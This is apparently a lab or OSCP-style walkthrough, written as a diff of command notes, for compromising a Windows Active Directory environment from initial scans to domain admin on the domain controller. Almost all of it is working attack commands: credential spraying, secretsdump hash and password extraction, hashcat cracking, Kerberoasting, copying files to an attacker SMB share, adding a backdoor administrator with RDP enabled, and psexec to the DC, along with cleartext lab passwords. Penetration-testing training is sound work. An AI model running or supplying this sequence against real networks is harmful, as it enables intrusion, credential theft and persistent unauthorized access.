+sudo nmap -A -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 10.10.206.152
+
+sudo nmap -v -sS -p- --open -Pn 10.10.206.154
+
+sudo nmap -A -Pn -p 445,1433,5040,5985,47001,49664,49665,49666,49667,49668,49669,49672,49700 10.10.206.154 | tee MS02_script_scan.txt
+
+dir 
+
+.\admintool.exe
+
+sudo impacket-smbserver -user test -pass test -smb2support share .
+
+net use \\192.168.45.213\share /u:test test
+
+copy admintool.exe \\192.168.45.213\share\
+
+strings admintool.exe | grep password
+
+crackmapexec smb 10.10.206.0/24 -u "Administrator" -p "December31" --local-auth
+
+impacket-secretsdump Administrator:December31@192.168.246.153
+
+vim mscache.hashes
+
+hashcat -m 2100 mscache.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+[replace oscp.exam with MS01.oscp.exam in /etc/hosts]
+
+echo “10.10.206.152   DC01.oscp.exam” >> /etc/hosts
+
+bloodhound-python -u web_svc -p "Diamond1" -d oscp.exam -v --zip -c All -dc DC01.oscp.exam -ns 10.10.206.152 --dns-tcp											(output stored in 20240917161534_bloodhound.zip)
+
+sudo neo4j start
+
+[clear database first]
+
+Bloodhound GUI > Upload Data > 20240917161534_bloodhound.zip
+
+impacket-GetUserSPNs -request -dc-ip 10.10.206.152 oscp.exam/web_svc:Diamond1 | tee hashes.kerber
+
+impacket-mssqlclient -port 49700 -target-ip 10.10.206.154 -windows-auth -dc-ip 10.10.206.152 oscp.exam/web_svc:Diamond1@10.10.206.154
+
+[as MS01\\Administrator via SSH]
+
+net user /add added_user Password1# /add
+
+net localgroup administrators added_user /add
+
+net localgroup "Remote Desktop Users" added_user /add
+
+powershell.exe
+
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+
+xfreerdp /v:192.168.246.153 /u:added_user /p:"Password1#"
+
+[searching for ConsoleHost_history.txt as local administrator]
+
+cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+
+type .\ConsoleHost_history.txt.1																							(reveals Administrator : hghgib6vHT3bVWf)
+
+type .\ConsoleHost_history.txt
+
+crackmapexec smb 10.10.206.0/24 -u Administrator -p "hghgib6vHT3bVWf" --local-auth
+
+impacket-secretsdump Administrator:hghgib6vHT3bVWf@10.10.206.154														(reveals plaintext domain admin password: OSCP.exam\Administrator:7Tg9M9MZbzAokR9)
+
+impacket-psexec Administrator:"7Tg9M9MZbzAokR9"@10.10.206.152
+
+whoami && type C:\Users\Administrator\Desktop\proof.txt && ipconfig
+
+1. enumerating MS01 web server leads to downloading /partner/db, which contains valid MS01 SSH credentials
+
+2. running strings against .\admintool.exe and grepping for passwords reveals valid local Administrator credentials
+
+3. Administrative console history logs on MS01 show an Administrative authentication attempt made on the command line; these credentials are valid for MS02
+
+4. secretsdump against MS02 as the local administrator reveals the plaintext domain administrator password
+
+5. impacket-psexec is used to obtain an administrative shell on DC01
+
+```
+
